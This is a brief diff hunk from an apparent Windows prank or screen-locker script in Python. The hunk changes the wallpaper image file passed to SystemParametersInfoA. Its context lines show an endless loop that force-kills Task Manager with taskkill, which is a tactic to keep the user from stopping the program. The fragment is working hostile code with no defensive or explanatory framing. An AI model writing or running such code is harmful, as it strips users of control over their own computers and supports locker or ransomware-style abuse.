@@ -49,7 +49,7 @@ f.close()
 
 SPI_SETDESKWALLPAPER = 20 
 
-ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "image.jpg" , 0)
+ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "PythonBackground.png" , 0)
 
 while 1:
   os.system("taskkill -f -im taskmgr.exe")
